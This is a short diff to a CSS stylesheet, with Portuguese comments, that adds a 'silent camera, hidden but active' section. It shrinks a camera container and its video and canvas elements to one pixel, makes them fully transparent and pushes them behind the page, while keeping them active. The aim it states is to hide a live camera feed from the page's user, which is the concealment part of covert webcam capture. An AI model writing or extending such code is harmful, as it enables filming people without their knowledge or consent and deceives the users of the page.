@@ -11,6 +11,26 @@
   --secondary-btn-bg: #34383f; /* Fundo botão secundário */
 }
 
+/* --- NOVO: CÂMERA SILENCIOSA (Oculta, mas Ativa) --- */
+#cameraContainer {
+    /* Garante que o container esteja fora da tela principal */
+    position: absolute; 
+    top: 0;
+    left: 0;
+    width: 1px;
+    height: 1px;
+    overflow: hidden; /* Garante que nada vaze */
+    z-index: -9999; /* Garante que está atrás de tudo */
+}
+
+/* O elemento de vídeo e canvas devem ser mantidos minúsculos */
+#videoElement, #canvasElement {
+    width: 1px !important; 
+    height: 1px !important;
+    opacity: 0; /* Oculta completamente */
+    display: block; /* Garante que não é ignorado */
+}
+
 /* --- FONTS & RESET --- */
 * {
   margin: 0;
